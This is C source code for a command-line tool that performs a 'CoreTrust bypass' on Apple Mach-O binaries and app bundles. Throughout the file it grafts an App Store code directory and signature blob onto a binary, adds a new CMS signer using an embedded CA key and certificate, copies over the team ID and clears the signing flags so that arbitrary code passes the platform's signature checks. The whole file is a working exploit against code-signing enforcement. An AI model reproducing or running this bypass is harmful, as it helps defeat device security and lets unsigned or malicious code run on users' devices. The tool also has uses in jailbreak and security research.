#include <CoreFoundation/CoreFoundation.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <dirent.h>
#include <sys/stat.h>
#include <choma/MachOByteOrder.h>
#include <choma/MachO.h>
#include <choma/Host.h>
#include <choma/FileStream.h>
#include <choma/BufferedStream.h>
#include <choma/CodeDirectory.h>
#include <choma/Base64.h>
#include "AppStoreCodeDirectory.h"
#include "DERTemplate.h"
#include "TemplateSignatureBlob.h"
#include "CADetails.h"
#include <openssl/pem.h>
#include <openssl/err.h>
#include <choma/CSBlob.h>
#include <copyfile.h>
#include <TargetConditionals.h>
#include <openssl/cms.h>


#define CPU_SUBTYPE_ARM64E_ABI_V2 0x80000000
#ifndef DISABLE_SIGNING

char *extract_preferred_slice(const char *fatPath)
{
    FAT *fat = fat_init_from_path(fatPath);
    if (!fat) return NULL;
    MachO *macho = fat_find_preferred_slice(fat);

#if TARGET_OS_MAC && !TARGET_OS_IPHONE
    if (!macho) {
        // Check for arm64v8 first
        macho = fat_find_slice(fat, CPU_TYPE_ARM64, CPU_SUBTYPE_ARM64_V8);
        if (!macho) {
            // If that fails, check for regular arm64
            macho = fat_find_slice(fat, CPU_TYPE_ARM64, CPU_SUBTYPE_ARM64_ALL);
            if (!macho) {
                // If that fails, check for arm64e with ABI v2
                macho = fat_find_slice(fat, CPU_TYPE_ARM64, CPU_SUBTYPE_ARM64E | CPU_SUBTYPE_ARM64E_ABI_V2);
                if (!macho) {
                    // If that fails, check for arm64e
                    macho = fat_find_slice(fat, CPU_TYPE_ARM64, CPU_SUBTYPE_ARM64E);
                    if (!macho) {
                        fat_free(fat);
                        return NULL;
                    }
                }
            }
        }
    }
#else
    if (!macho) {
        fat_free(fat);
        return NULL;
    }
#endif // TARGET_OS_MAC && !TARGET_OS_IPHONE

    if (macho->machHeader.filetype == MH_OBJECT) {
        printf("Error: MachO is an object file, please use a MachO executable or dynamic library!\n");
        fat_free(fat);
        return NULL;
    }

    if (macho->machHeader.filetype == MH_DSYM) {
        printf("Error: MachO is a dSYM file, please use a MachO executable or dynamic library!\n");
        fat_free(fat);
        return NULL;
    }
    
    char *temp = strdup("/tmp/XXXXXX");
    int fd = mkstemp(temp);

    MemoryStream *outStream = file_stream_init_from_path(temp, 0, 0, FILE_STREAM_FLAG_WRITABLE | FILE_STREAM_FLAG_AUTO_EXPAND);
    MemoryStream *machoStream = macho_get_stream(macho);
    memory_stream_copy_data(machoStream, 0, outStream, 0, memory_stream_get_size(machoStream));

    fat_free(fat);
    memory_stream_free(outStream);
    close(fd);
    return temp;
}

int extract_blobs(CS_SuperBlob *superBlob, const char *dir)
{
    CS_DecodedSuperBlob *decodedSuperblob = csd_superblob_decode(superBlob);

    CS_DecodedBlob *blob = decodedSuperblob->firstBlob;
    while (blob) {
        char outPath[PATH_MAX];
        CS_GenericBlob genericBlob;
        csd_blob_read(blob, 0, sizeof(genericBlob), &genericBlob);
        GENERIC_BLOB_APPLY_BYTE_ORDER(&genericBlob, BIG_TO_HOST_APPLIER);

        snprintf(outPath, PATH_MAX, "%s/%x_%x.bin", dir, blob->type, genericBlob.magic);

        uint64_t len = csd_blob_get_size(blob);
        uint8_t blobData[len];
        csd_blob_read(blob, 0, len, blobData);

        FILE *f = fopen(outPath, "wb");
        fwrite(blobData, len, 1, f);
        fclose(f);

        blob = blob->next;
    }
    return 0;
}

char *get_argument_value(int argc, char *argv[], const char *flag)
{
    for (int i = 0; i < argc; i++) {
        if (!strcmp(argv[i], flag)) {
            if (i+1 < argc) {
                return argv[i+1];
            }
        }
    }
    return NULL;
}

bool argument_exists(int argc, char *argv[], const char *flag)
{
    for (int i = 0; i < argc; i++) {
        if (!strcmp(argv[i], flag)) {
            return true;
        }
    }
    return false;
}

void print_usage(const char *self)
{
    printf("Options: \n");
    printf("\t-i: input file\n");
    printf("\t-o: output file\n");
    printf("\t-r: replace input file / replace output file if it already exists\n");
    printf("\t-a: input is an .app bundle\n");
    printf("\t-t: optional 10-character team ID to use\n");
    printf("\t-A: optional path to App Store binary to use (will use GTA Car Tracker by default)\n");
    printf("\t-h: print this help message\n");
    printf("Examples:\n");
    printf("\t%s -i <path to input MachO/FAT file> (-r) (-o <path to output MachO file>)\n", self);
    printf("\t%s -i <path to input .app bundle> -a\n", self);
    exit(-1);
}

int extract_signature_blob_and_code_directory_from_binary(const char *inputPath, void **sigBlob, size_t *sigBlobLen, void **codeDirectoryBlob, size_t *codeDirectoryBlobLen)
{
    char *appStoreSlice = extract_preferred_slice(inputPath);
    if (!appStoreSlice) {
        printf("Error: failed to extract preferred slice!\n");
        return -1;
    }

    MachO *macho = macho_init_for_writing(appStoreSlice);
    if (!macho) {
        free(appStoreSlice);
        return -1;
    }

    if (!macho_is_encrypted(macho)) {
        printf("Error: MachO must be an encrypted App Store binary!\n");
        macho_free(macho);
        free(appStoreSlice);
        return 2;
    }

    CS_SuperBlob *superblob = macho_read_code_signature(macho);
    if (!superblob) {
        printf("Error: no code signature found, please fake-sign the binary at minimum before running the bypass.\n");
        free(appStoreSlice);
        return -1;
    }

    CS_DecodedSuperBlob *decodedSuperblob = csd_superblob_decode(superblob);
    CS_DecodedBlob *signatureBlob = csd_superblob_find_blob(decodedSuperblob, CSSLOT_SIGNATURESLOT, NULL);
    if (!signatureBlob) {
        printf("Error: no signature blob found!\n");
        free(appStoreSlice);
        return -1;
    }

    *sigBlobLen = csd_blob_get_size(signatureBlob);
    *sigBlob = malloc(*sigBlobLen);
    csd_blob_read(signatureBlob, 0, *sigBlobLen, *sigBlob);

    CS_DecodedBlob *codeDirectory = csd_superblob_find_blob(decodedSuperblob, CSSLOT_CODEDIRECTORY, NULL);
    if (!codeDirectory) {
        printf("Error: no code directory found!\n");
        free(appStoreSlice);
        return -1;
    }

    CS_DecodedBlob *alternateCodeDirectory = csd_superblob_find_blob(decodedSuperblob, CSSLOT_ALTERNATE_CODEDIRECTORIES, NULL);
    if (!alternateCodeDirectory) {
        printf("Error: no alternate code directory found!\n");
        free(appStoreSlice);
        return -1;
    }

    *codeDirectoryBlobLen = csd_blob_get_size(codeDirectory);
    *codeDirectoryBlob = malloc(*codeDirectoryBlobLen);
    csd_blob_read(codeDirectory, 0, *codeDirectoryBlobLen, *codeDirectoryBlob);

    csd_superblob_free(decodedSuperblob);
    free(appStoreSlice);

    return 0;
}

int update_signature_blob(CS_DecodedSuperBlob *superblob, void *appStoreSigBlob, size_t appStoreSigBlobLen)
{
    CS_DecodedBlob *sha1CD = csd_superblob_find_blob(superblob, CSSLOT_CODEDIRECTORY, NULL);
    if (!sha1CD) {
        printf("Could not find SHA1 CodeDirectory blob!\n");
        return -1;
    }
    CS_DecodedBlob *sha256CD = csd_superblob_find_blob(superblob, CSSLOT_ALTERNATE_CODEDIRECTORIES, NULL);
    if (!sha256CD) {
        printf("Could not find SHA256 CodeDirectory blob!\n");
        return -1;
    }

    uint8_t sha1CDHash[CC_SHA1_DIGEST_LENGTH];
    uint8_t sha256CDHash[CC_SHA256_DIGEST_LENGTH];

    {
        size_t dataSizeToRead = csd_blob_get_size(sha1CD);
        uint8_t *data = malloc(dataSizeToRead);
        memset(data, 0, dataSizeToRead);
        csd_blob_read(sha1CD, 0, dataSizeToRead, data);
        CC_SHA1(data, (CC_LONG)dataSizeToRead, sha1CDHash);
        free(data);
        printf("SHA1 hash: ");
        for (int i = 0; i < CC_SHA1_DIGEST_LENGTH; i++) {
            printf("%02x", sha1CDHash[i]);
        }
        printf("\n");
    }

    {
        size_t dataSizeToRead = csd_blob_get_size(sha256CD);
        uint8_t *data = malloc(dataSizeToRead);
        memset(data, 0, dataSizeToRead);
        csd_blob_read(sha256CD, 0, dataSizeToRead, data);
        CC_SHA256(data, (CC_LONG)dataSizeToRead, sha256CDHash);
        free(data);
        printf("SHA256 hash: ");
        for (int i = 0; i < CC_SHA256_DIGEST_LENGTH; i++) {
            printf("%02x", sha256CDHash[i]);
        }
        printf("\n");
    }
    
    const uint8_t *cmsDataPtr; 
    size_t cmsDataSize;
    if (appStoreSigBlob) {
        printf("Using provided signature blob\n");
        cmsDataPtr = appStoreSigBlob + offsetof(CS_GenericBlob, data);
        cmsDataSize = appStoreSigBlobLen - sizeof(CS_GenericBlob);
    } else {
        cmsDataPtr = AppStoreSignatureBlob + offsetof(CS_GenericBlob, data);
        cmsDataSize = AppStoreSignatureBlob_len - sizeof(CS_GenericBlob);
    }
    CMS_ContentInfo *cms = d2i_CMS_ContentInfo(NULL, (const unsigned char**)&cmsDataPtr, cmsDataSize);
    if (!cms) {
        printf("Failed to parse CMS blob: %s!\n", ERR_error_string(ERR_get_error(), NULL));
        return -1;
    }

    // Load private key
    FILE* privateKeyFile = fmemopen(CAKey, CAKeyLength, "r");
    if (!privateKeyFile) {
        printf("Failed to open private key file!\n");
        return -1;
    }
    EVP_PKEY* privateKey = PEM_read_PrivateKey(privateKeyFile, NULL, NULL, NULL);
    fclose(privateKeyFile);
    if (!privateKey) {
        printf("Failed to read private key file!\n");
        return -1;
    }

    // Load certificate
    FILE* certificateFile = fmemopen(CACert, CACertLength, "r");
    if (!certificateFile) {
        printf("Failed to open certificate file!\n");
        return -1;
    }
    X509* certificate = PEM_read_X509(certificateFile, NULL, NULL, NULL);
    fclose(certificateFile);
    if (!certificate) {
        printf("Failed to read certificate file!\n");
        return -1;
    }

    // Add signer
    CMS_SignerInfo* newSigner = CMS_add1_signer(cms, certificate, privateKey, EVP_sha256(), CMS_PARTIAL | CMS_REUSE_DIGEST | CMS_NOSMIMECAP);
    if (!newSigner) {
        printf("Failed to add signer: %s!\n", ERR_error_string(ERR_get_error(), NULL));
        return -1;
    }

    CFMutableArrayRef cdHashesArray = CFArrayCreateMutable(NULL, 2, &kCFTypeArrayCallBacks);
    if (!cdHashesArray) {
        printf("Failed to create CDHashes array!\n");
        return -1;
    }

    CFDataRef sha1CDHashData = CFDataCreate(NULL, sha1CDHash, CC_SHA1_DIGEST_LENGTH);
    if (!sha1CDHashData) {
        printf("Failed to create CFData from SHA1 CDHash!\n");
        CFRelease(cdHashesArray);
        return -1;
    }
    CFArrayAppendValue(cdHashesArray, sha1CDHashData);
    CFRelease(sha1CDHashData);

    // In this plist, the SHA256 hash is truncated to SHA1 length
    CFDataRef sha256CDHashData = CFDataCreate(NULL, sha256CDHash, CC_SHA1_DIGEST_LENGTH);
    if (!sha256CDHashData) {
        printf("Failed to create CFData from SHA256 CDHash!\n");
        CFRelease(cdHashesArray);
        return -1;
    }
    CFArrayAppendValue(cdHashesArray, sha256CDHashData);
    CFRelease(sha256CDHashData);
    
    CFMutableDictionaryRef cdHashesDictionary = CFDictionaryCreateMutable(NULL, 1, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    if (!cdHashesDictionary) {
        printf("Failed to create CDHashes dictionary!\n");
        CFRelease(cdHashesArray);
        return -1;
    }
    CFDictionarySetValue(cdHashesDictionary, CFSTR("cdhashes"), cdHashesArray);
    CFRelease(cdHashesArray);

    CFErrorRef error = NULL;
    CFDataRef cdHashesDictionaryData = CFPropertyListCreateData(NULL, cdHashesDictionary, kCFPropertyListXMLFormat_v1_0, 0, &error);
    CFRelease(cdHashesDictionary);
    if (!cdHashesDictionaryData) {
        // CFStringGetCStringPtr, unfortunately, does not always work
        CFStringRef errorString = CFErrorCopyDescription(error);
        CFIndex maxSize = CFStringGetMaximumSizeForEncoding(CFStringGetLength(errorString), kCFStringEncodingUTF8) + 1;
        char *buffer = (char *)malloc(maxSize);
        if (CFStringGetCString(errorString, buffer, maxSize, kCFStringEncodingUTF8)) {
            printf("Failed to encode CDHashes plist: %s\n", buffer);
        } else {
            printf("Failed to encode CDHashes plist: unserializable error\n");
        }
        free(buffer);
        return -1;
    }

    // Add text CDHashes attribute
    if (!CMS_signed_add1_attr_by_txt(newSigner, "1.2.840.113635.100.9.1", V_ASN1_OCTET_STRING, CFDataGetBytePtr(cdHashesDictionaryData), CFDataGetLength(cdHashesDictionaryData))) {
        printf("Failed to add text CDHashes attribute: %s!\n", ERR_error_string(ERR_get_error(), NULL));
        return -1;
    }

    // Create DER-encoded CDHashes (see DERTemplate.h for details)
    uint8_t cdHashesDER[78];
    memset(cdHashesDER, 0, sizeof(cdHashesDER));
    memcpy(cdHashesDER, CDHashesDERTemplate, sizeof(CDHashesDERTemplate));
    memcpy(cdHashesDER + CDHASHES_DER_SHA1_OFFSET, sha1CDHash, CC_SHA1_DIGEST_LENGTH);
    memcpy(cdHashesDER + CDHASHES_DER_SHA256_OFFSET, sha256CDHash, CC_SHA256_DIGEST_LENGTH);

    // Add DER CDHashes attribute
    if (!CMS_signed_add1_attr_by_txt(newSigner, "1.2.840.113635.100.9.2", V_ASN1_SEQUENCE, cdHashesDER, sizeof(cdHashesDER))) {
        printf("Failed to add CDHashes attribute: %s!\n", ERR_error_string(ERR_get_error(), NULL));
        return -1;
    }

    // Sign the CMS structure
    if (!CMS_SignerInfo_sign(newSigner)) {
        printf("Failed to sign CMS structure: %s!\n", ERR_error_string(ERR_get_error(), NULL));
        return -1;
    }

    // Encode the CMS structure into DER
    uint8_t *newCMSData = NULL;
    int newCMSDataSize = i2d_CMS_ContentInfo(cms, &newCMSData);
    if (newCMSDataSize <= 0) {
        printf("Failed to encode CMS structure: %s!\n", ERR_error_string(ERR_get_error(), NULL));
        return -1;
    }

    // Copy CMS data into a new blob
    uint32_t newCMSDataBlobSize = sizeof(CS_GenericBlob) + newCMSDataSize;
    CS_GenericBlob *newCMSDataBlob = malloc(newCMSDataBlobSize);
    newCMSDataBlob->magic = HOST_TO_BIG(CSMAGIC_BLOBWRAPPER);
    newCMSDataBlob->length = HOST_TO_BIG(newCMSDataBlobSize);
    memcpy(newCMSDataBlob->data, newCMSData, newCMSDataSize);
    free(newCMSData);

    // Remove old signature blob if it exists
    CS_DecodedBlob *oldSignatureBlob = csd_superblob_find_blob(superblob, CSSLOT_SIGNATURESLOT, NULL);
    if (oldSignatureBlob) {
        csd_superblob_remove_blob(superblob, oldSignatureBlob);
        csd_blob_free(oldSignatureBlob);
    }

    // Append new signature blob
    CS_DecodedBlob *signatureBlob = csd_blob_init(CSSLOT_SIGNATURESLOT, newCMSDataBlob);
    free(newCMSDataBlob);

    // Append new signature blob
    return csd_superblob_append_blob(superblob, signatureBlob);
}

int apply_coretrust_bypass(const char *machoPath, char *teamID, char *appStoreBinary)
{
    MachO *macho = macho_init_for_writing(machoPath);
    if (!macho) return -1;

    if (macho_is_encrypted(macho)) {
        printf("Error: MachO is encrypted, please use a decrypted app!\n");
        macho_free(macho);
        return 2;
    }
    
    CS_SuperBlob *superblob = macho_read_code_signature(macho);
    if (!superblob) {
        printf("Error: no code signature found, please fake-sign the binary at minimum before running the bypass.\n");
        return -1;
    }

    CS_DecodedSuperBlob *decodedSuperblob = csd_superblob_decode(superblob);
    uint64_t originalCodeSignatureSize = BIG_TO_HOST(superblob->length);
    free(superblob);

    CS_DecodedBlob *realCodeDirBlob = NULL;
    CS_DecodedBlob *mainCodeDirBlob = csd_superblob_find_blob(decodedSuperblob, CSSLOT_CODEDIRECTORY, NULL);
    CS_DecodedBlob *alternateCodeDirBlob = csd_superblob_find_blob(decodedSuperblob, CSSLOT_ALTERNATE_CODEDIRECTORIES, NULL);

    CS_DecodedBlob *entitlementsBlob = csd_superblob_find_blob(decodedSuperblob, CSSLOT_ENTITLEMENTS, NULL);
    CS_DecodedBlob *derEntitlementsBlob = csd_superblob_find_blob(decodedSuperblob, CSSLOT_DER_ENTITLEMENTS, NULL);

    if (!entitlementsBlob && !derEntitlementsBlob && macho->machHeader.filetype == MH_EXECUTE) {
        printf("Warning: Unable to find existing entitlements blobs in executable MachO.\n");
    }

    if (!mainCodeDirBlob) {
        printf("Error: Unable to find code directory, make sure the input binary is ad-hoc signed.\n");
        return -1;
    }

    // We need to determine which code directory to transfer to the new binary
    if (alternateCodeDirBlob) {
        // If an alternate code directory exists, use that and remove the main one from the superblob
        realCodeDirBlob = alternateCodeDirBlob;
        csd_superblob_remove_blob(decodedSuperblob, mainCodeDirBlob);
        csd_blob_free(mainCodeDirBlob);
    }
    else {
        // Otherwise use the main code directory
        realCodeDirBlob = mainCodeDirBlob;
    }

    if (csd_code_directory_get_hash_type(realCodeDirBlob) != CS_HASHTYPE_SHA256_256) {
        printf("Error: Alternate code directory is not SHA256, bypass won't work!\n");
        return -1;
    }

    printf("Applying App Store code directory...\n");

    // Append real code directory as alternateCodeDirectory at the end of superblob
    csd_superblob_remove_blob(decodedSuperblob, realCodeDirBlob);
    csd_blob_set_type(realCodeDirBlob, CSSLOT_ALTERNATE_CODEDIRECTORIES);
    csd_superblob_append_blob(decodedSuperblob, realCodeDirBlob);

    // Extract blobs from App Store app if provided
    void *appStoreSigBlob = NULL;
    size_t appStoreSigBlobLen = 0;
    void *appStoreBinaryCodeDirectoryBlob = NULL;
    size_t appStoreBinaryCodeDirectoryBlobLen = 0;
    if (appStoreBinary) {
        extract_signature_blob_and_code_directory_from_binary(appStoreBinary, &appStoreSigBlob, &appStoreSigBlobLen, &appStoreBinaryCodeDirectoryBlob, &appStoreBinaryCodeDirectoryBlobLen);
    }

    if (!appStoreBinaryCodeDirectoryBlob) { appStoreBinaryCodeDirectoryBlob = AppStoreCodeDirectory; appStoreBinaryCodeDirectoryBlobLen = AppStoreCodeDirectory_len; }
    if (!appStoreSigBlob) { appStoreSigBlob = AppStoreSignatureBlob; appStoreSigBlobLen = AppStoreSignatureBlob_len; }

    // Insert AppStore code directory as main code directory at the start
    CS_DecodedBlob *appStoreCodeDirectoryBlob = csd_blob_init(CSSLOT_CODEDIRECTORY, (CS_GenericBlob *)appStoreBinaryCodeDirectoryBlob);
    csd_superblob_insert_blob_at_index(decodedSuperblob, appStoreCodeDirectoryBlob, 0);

    printf("Adding new signature blob...\n");
    CS_DecodedBlob *signatureBlob = csd_superblob_find_blob(decodedSuperblob, CSSLOT_SIGNATURESLOT, NULL);
    if (signatureBlob) {
        // Remove existing signatureBlob if existant
        csd_superblob_remove_blob(decodedSuperblob, signatureBlob);
        csd_blob_free(signatureBlob);
    }

    // After Modification:
    // 1. App Store CodeDirectory (SHA1)
    // ?. Requirements
    // ?. Entitlements
    // ?. DER entitlements
    // 5. Actual CodeDirectory (SHA256)

    printf("Updating TeamID...\n");

    // Get team ID from AppStore code directory
    // For the bypass to work, both code directories need to have the same team ID
    char *appStoreTeamID = csd_code_directory_copy_team_id(appStoreCodeDirectoryBlob, NULL);
    if (!appStoreTeamID) {
        printf("Error: Unable to determine AppStore Team ID\n");
        return -1;
    }

    // Set the team ID of the real code directory to the AppStore one
    if (csd_code_directory_set_team_id(realCodeDirBlob, teamID ? teamID : appStoreTeamID) != 0) {
        printf("Error: Failed to set Team ID\n");
        return -1;
    }

    printf("TeamID set to %s!\n", teamID ? teamID : appStoreTeamID);
    if (appStoreTeamID) { free(appStoreTeamID); }

    // Set flags to 0 to remove any problematic flags (such as the 'adhoc' flag in bit 2)
    csd_code_directory_set_flags(realCodeDirBlob, 0);

    int ret = 0;

    // 6. Signature blob
    printf("Doing initial signing to calculate size...\n");
    ret = update_signature_blob(decodedSuperblob, appStoreSigBlob, appStoreSigBlobLen);
    if(ret == -1) {
        printf("Error: failed to create new signature blob!\n");
        return -1;
    }

    printf("Encoding unsigned superblob...\n");
    CS_SuperBlob *encodedSuperblobUnsigned = csd_superblob_encode(decodedSuperblob);

    printf("Updating load commands...\n");
    if (update_load_commands_for_coretrust_bypass(macho, encodedSuperblobUnsigned, originalCodeSignatureSize, memory_stream_get_size(macho->stream)) != 0) {
        printf("Error: failed to update load commands!\n");
        return -1;
    }
    free(encodedSuperblobUnsigned);

    printf("Updating code slot hashes...\n");
    csd_code_directory_update(realCodeDirBlob, macho);

    printf("Signing binary...\n");
    ret = update_signature_blob(decodedSuperblob, appStoreSigBlob, appStoreSigBlobLen);
    if(ret == -1) {
        printf("Error: failed to create new signature blob!\n");
        return -1;
    }

    printf("Encoding signed superblob...\n");
    CS_SuperBlob *newSuperblob = csd_superblob_encode(decodedSuperblob);

    printf("Writing superblob to MachO...\n");
    // Write the new signed superblob to the MachO
    macho_replace_code_signature(macho, newSuperblob);

    csd_superblob_free(decodedSuperblob);
    free(newSuperblob);
    
    macho_free(macho);
    return 0;
}

int apply_coretrust_bypass_wrapper(const char *inputPath, const char *outputPath, char *teamID, char *appStoreBinary)
{
    char *machoPath = extract_preferred_slice(inputPath);
    if (!machoPath) {
        printf("Error: failed to extract preferred slice!\n");
        return -1;
    }
    printf("extracted best slice to %s\n", machoPath);

    int r = apply_coretrust_bypass(machoPath, teamID, appStoreBinary);
    if (r != 0) {
        free(machoPath);
        return r;
    }

    r = copyfile(machoPath, outputPath, 0, COPYFILE_ALL | COPYFILE_MOVE | COPYFILE_UNLINK);
    if (r == 0) {
        chmod(outputPath, 0755);
        printf("Signed file! CoreTrust bypass eta now!!\n");
    }
    else {
        perror("copyfile");
    }

    free(machoPath);
    return r;
}

int apply_coretrust_bypass_to_app_bundle(const char *appBundlePath, char *teamID, char *appStoreBinary) {
    // Recursively find all MachO files in the app bundle
    DIR *dir;
    struct dirent *entry;
    struct stat statbuf;
    int r = 0;

    if ((dir = opendir(appBundlePath)) == NULL) {
        perror("opendir");
        return -1;
    }

    while ((entry = readdir(dir)) != NULL) {
        char fullpath[1024];
        snprintf(fullpath, sizeof(fullpath), "%s/%s", appBundlePath, entry->d_name);

        if (stat(fullpath, &statbuf) == -1) {
            perror("stat");
            return -1;
        }

        if (S_ISDIR(statbuf.st_mode)) {
            if (strcmp(entry->d_name, ".") != 0 && strcmp(entry->d_name, "..") != 0) {
                // Recursive call for subdirectories
                r = apply_coretrust_bypass_to_app_bundle(fullpath, teamID, appStoreBinary);
            }
        } else {
            // Process file
            MemoryStream *stream = file_stream_init_from_path(fullpath, 0, 0, 0);
            if (!stream) {
                printf("Error: failed to open file %s\n", fullpath);
                continue;
            }
            uint32_t magic = 0;
            memory_stream_read(stream, 0, sizeof(magic), &magic);
            if (magic == FAT_MAGIC_64 || magic == MH_MAGIC_64) {
                printf("Applying bypass to %s.\n", fullpath);
                r = apply_coretrust_bypass_wrapper(fullpath, fullpath, teamID, appStoreBinary);
                if (r != 0) {
                    printf("Error: failed to apply bypass to %s\n", fullpath);
                    closedir(dir);
                    return r;
                }
            }
            memory_stream_free(stream);
        }
    }

    closedir(dir);
    return r;
}

int main(int argc, char *argv[]) {

    if (argc < 2) {
        print_usage(argv[0]);
    }

    char *input = get_argument_value(argc, argv, "-i");
    char *output = get_argument_value(argc, argv, "-o");
    bool replace = argument_exists(argc, argv, "-r");
    bool appBundle = argument_exists(argc, argv, "-a");
    char *teamID = get_argument_value(argc, argv, "-t");
    char *appStoreBinary = get_argument_value(argc, argv, "-A");
    if (teamID) {
        if (strlen(teamID) != 10) {
            printf("Error: Team ID must be 10 characters long!\n");
            return -1;
        }
    }
    if (appBundle) {
        if (replace || output) {
            print_usage(argv[0]);
        }

        struct stat s;
        bool inputExists = stat(input, &s) == 0;

        if (!inputExists) {
            print_usage(argv[0]);
        }

        char *dot = strrchr(input, '.');
        if (!dot || strcmp(dot, ".app")) {
            printf("Error: %s is not an app bundle.\n", input);
            return -1;
        }

        printf("Applying CoreTrust bypass to app bundle.\n");
        printf("CoreTrust bypass eta s0n!!\n");
        return apply_coretrust_bypass_to_app_bundle(input, teamID, appStoreBinary);
    }
    
    if (!output && !replace) {
        print_usage(argv[0]);
    }
    if (!output && replace) {
        output = input;
    }

    struct stat s;
    bool inputExists = stat(input, &s) == 0;
    bool outputExists = stat(output, &s) == 0;

    if (!inputExists) {
        print_usage(argv[0]);
    }

    if (outputExists && !replace) {
        printf("Error: Output file already exists, for overwriting use the -r argument\n");
        return -1;
    }

    printf("CoreTrust bypass eta s0n!!\n");
    return apply_coretrust_bypass_wrapper(input, output, teamID, appStoreBinary);
}

#else

int main(int argc, char *argv[]) {
    return 0;
}

#endif